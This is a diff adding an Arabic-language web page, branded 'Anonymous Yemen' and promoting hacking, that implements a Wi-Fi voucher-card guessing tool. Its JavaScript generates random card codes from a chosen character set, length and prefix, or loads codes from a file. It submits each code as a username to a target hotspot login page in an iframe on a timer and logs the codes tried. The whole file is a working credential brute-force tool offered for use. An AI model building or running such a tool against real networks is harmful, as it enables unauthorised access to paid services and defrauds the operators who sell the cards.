@@ -1,0 +1,243 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8">
+    <title>تخمين كروت شبكة الواي فاي</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            background-color: #000;
+            color: #fff;
+        }
+        .toolsbox {
+            width: 80%;
+            margin: 20px auto;
+            padding: 20px;
+            background-color: #111;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.5);
+            border-radius: 10px;
+            text-align: center;
+        }
+        .toolsbox input, .toolsbox button {
+            width: calc(100% - 22px);
+            margin-top: 10px;
+        }
+        .toolsbox input {
+            height: 30px;
+            border: 1px solid #555;
+            border-radius: 5px;
+            padding: 5px;
+            background-color: #222;
+            color: #fff;
+        }
+        .toolsbox button {
+            height: 35px;
+            border: none;
+            border-radius: 5px;
+            background-color: #28a745;
+            color: #fff;
+            font-weight: bold;
+            cursor: pointer;
+        }
+        .toolsbox button:hover {
+            background-color: #218838;
+        }
+        #dlink {
+            text-decoration: none;
+            color: black;
+            background-color: orange;
+            padding: 5px 10px;
+            visibility: hidden;
+            font-weight: bold;
+            border-radius: 5px;
+        }
+        #currentUsername {
+            width: calc(100% - 22px);
+            height: 30px;
+            border: 1px solid #555;
+            border-radius: 5px;
+            padding: 5px;
+            margin-top: 10px;
+            background-color: #222;
+            color: #fff;
+            font-weight: bold;
+        }
+        #loginPageViewer {
+            width: 100%;
+            height: 500px;
+            border: none;
+            margin-top: 20px;
+        }
+        progress {
+            width: 100%;
+            height: 20px;
+            margin-top: 10px;
+        }
+        #completionImage {
+            display: none;
+            margin-top: 20px;
+            max-width: 100%;
+            height: auto;
+        }
+        #welcomeText {
+            margin-top: 20px;
+            font-size: 1.2em;
+            line-height: 1.5;
+        }
+        .ascii-art {
+            white-space: pre-wrap;
+            font-family: monospace;
+            color: #00FFFF;
+            text-align: center;
+            line-height: 1.2;
+            margin: 20px 0;
+        }
+    </style>
+</head>
+<body onload="showCompletionImage()">
+    <div class="toolsbox">
+        <div class="ascii-art">
+        ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣄⣴⣴⣾⣾⣾⣿⣿⣾⣿⣾⣿⣷⣷⣷⣷⣦⣦⣠⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⣿⢿⢛⢏⢟⢟⣿⣿⣿⣿⣿⣿⣿⣿⡿⡟⡟⢝⢟⢿⣿⣿⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢼⣿⣏⣔⣴⣰⢄⢌⠘⠽⣿⣿⣿⣿⡿⠏⢃⢡⣠⣢⣢⣌⣻⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣮⡢⣮⣿⣿⣿⣮⢪⣾⣾⣿⣿⣿⣿⣿⣿⣯⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⢿⣟⠽⠊⠊⠊⠫⢻⣾⣿⣿⣿⣷⠻⠙⠘⠘⠚⢽⢿⣿⣿⣯⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣵⣷⣽⣪⣞⣮⣮⣾⣿⣾⣿⣯⣿⣷⣵⣲⣲⣳⣵⣷⣷⣻⣯⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢗⣿⣿⣿⣺⣿⣿⣿⣿⣿⣿⣿⣿⣿⣗⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢽⣿⣿⣿⣿⣿⣿⢟⣿⣽⣟⣿⣿⣿⢾⣾⢿⡻⣿⣿⣿⣿⣿⢿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢘⣷⣕⢭⠹⣾⣾⣿⣿⣏⡻⡽⣟⡟⣏⣿⣿⣿⣾⡾⠍⣕⢧⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢿⣷⣝⢦⡈⠟⠟⠟⠏⠁⣠⣦⡀⠈⠛⠟⠟⠟⢁⡾⣣⣿⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣿⣿⣎⢷⣷⣶⣵⣮⣦⣫⣫⣫⣦⣵⣶⣵⣾⢾⣱⣿⣿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⢿⣿⣯⣷⣿⣿⣿⣿⡛⠛⣻⣿⣿⣿⣿⣟⣵⣿⡿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠛⢿⣷⣿⣿⣿⣿⡏⠀⢻⣿⣿⣿⣿⣾⡿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢿⣿⣿⣿⡅⠀⣸⣿⣿⣿⠟⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⢿⣧⢀⣾⡿⠟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+        </div>        𝒎𝒂𝒈𝒓𝒎•
+        <h1>𝗔𝗡𝗢𝗡𝗬𝗠𝗢𝗨𝗦 𝗬𝗘𝗠𝗘𝗡</h1>
+        <p id="welcomeText">
+            مرحباً بكم في عالمي حيث الشاشة السوداء وسطر الأوامر.<br>
+            - كل ما يخص القرصنة الإلكترونية.<br>
+            - اختبار الاختراق مع كالي لينكس💻.<br><br>
+       قبل عقيد<br>
+            يمكنكم  مراسلتناء واتساب لاستقبال التحديثات الجديده:<br>
+            <a href="https://api.whatsapp.com/send?phone=+967733570889" style="color: #00f;">https://api.whatsapp.com/send?phone=+967773186314</a>
+        </p>
+        <a id="dlink" download>حفظ في الملفات</a>
+        <label for="loginURL">رابط صفحة تسجيل الدخول:</label>
+        <input type="text" id="loginURL" value="http://g.com/login" />
+        <label for="loginChars">الرموز المكونة للكرت:</label>
+        <input type="text" id="loginChars" value="0123456789" />
+        <label for="loginUsernameLength">عدد الرموز المكونة للكرت:</label>
+        <input type="number" id="loginUsernameLength" value="10" />
+        <label for="loginUsernameFixed">جزء بداية الكرت إذا كان ثابت:</label>
+        <input type="text" id="loginUsernameFixed" value="9h" />
+        <label for="loginCount">عدد الكروت المطلوب تخمينها ومن ثم توقف:</label>
+        <input type="number" id="loginCount" value="100" />
+        <label for="loginTimeOut">الزمن بين المحاولة والمحاولة (بالملي ثانية):</label>
+        <input type="number" id="loginTimeOut" value="1000" />
+        <button onclick="usingFile()">إستخدم الكروت من ملف</button>
+        <button onclick="runProgram()">إبدأ</button>
+        <button onclick="stopProgram()">توقف</button>
+        <button onclick="saveFile()">حفظ الكروت التي تم تجريبها</button>
+        <progress id="prog" max="100"></progress>
+        <input id="currentUsername" readonly />
+        <iframe src="" id="loginPageViewer"></iframe>
+        <img id="completionImage" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAA...your_base64_encoded_image_data_here..." alt="𝗔𝗡𝗢𝗡𝗬𝗠𝗢𝗨𝗦 𝗬𝗘𝗠𝗘𝗡">
+    </div>
+    <script>
+        var fileData = [];
+        var isUsingFile = false;
+        var dataUsed = [];
+        var ref;
+        var counter = 0;
+
+        function sanitizeInput(input) {
+            return input.replace(/</g, "&lt;").replace(/>/g, "&gt;");
+        }
+
+        function getRandom() {
+            let pwdLen = (parseInt(document.getElementById('loginUsernameLength').value) - document.getElementById('loginUsernameFixed').value.length);
+            let chars = sanitizeInput(document.getElementById('loginChars').value);
+            let result = sanitizeInput(document.getElementById('loginUsernameFixed').value);
+            for (let x = 0; x < pwdLen; x++) {
+                result += chars.charAt(Math.floor(Math.random() * chars.length));
+            }
+            return result;
+        }
+
+        function usingFile() {
+            let filename = prompt("Input file path (must be a .js file):", "");
+            if (filename.endsWith('.js')) {
+                isUsingFile = true;
+                let sc = document.createElement("script");
+                sc.src = filename;
+                document.body.appendChild(sc);
+            } else {
+                alert("Invalid file type. Please provide a .js file.");
+            }
+        }
+
+        function saveFile() {
+            let filename = prompt("Input file name to save:", "");
+            if (filename) {
+                let myjson = JSON.stringify(dataUsed);
+                let text = encodeURIComponent("fileData=" + myjson + ";");
+                let dlink = document.getElementById("dlink");
+                dlink.href = "data:text/plain;charset=utf-8," + text;
+                dlink.download = filename;
+                dlink.style.visibility = "visible";
+                alert("File saved successfully!");
+            } else {
+                alert("File name cannot be empty.");
+            }
+        }
+
+        function stopProgram() {
+            clearInterval(ref);
+            document.getElementById('completionImage').style.display = 'block';
+        }
+
+        function runProgram() {
+            counter = 0;
+            document.getElementById('completionImage').style.display = 'none';
+            if (isUsingFile) {
+                ref = setInterval(loginFromFile, parseInt(document.getElementById('loginTimeOut').value));
+            } else {
+                ref = setInterval(loginFromScript, parseInt(document.getElementById('loginTimeOut').value));
+            }
+        }
+
+        function loginFromFile() {
+            if (counter < fileData.length) {
+                let cpwd = fileData[counter++];
+                document.getElementById('loginPageViewer').src = document.getElementById('loginURL').value + "?username=" + cpwd;
+                document.getElementById('currentUsername').value = cpwd;
+            } else {
+                stopProgram();
+            }
+        }
+
+        function loginFromScript() {
+            if (counter < parseInt(document.getElementById('loginCount').value)) {
+                let cpwd = getRandom();
+                document.getElementById('loginPageViewer').src = document.getElementById('loginURL').value + "?username=" + cpwd;
+                document.getElementById('currentUsername').value = cpwd;
+                dataUsed.push(cpwd);
+                document.getElementById('prog').value = Math.floor((counter / document.getElementById('loginCount').value) * 100);
+                counter++;
+            } else {
+                stopProgram();
+            }
+        }
+
+        function showCompletionImage() {
+            document.getElementById('completionImage').style.display = 'block';
+        }
+    </script>
+</body>
+</html>
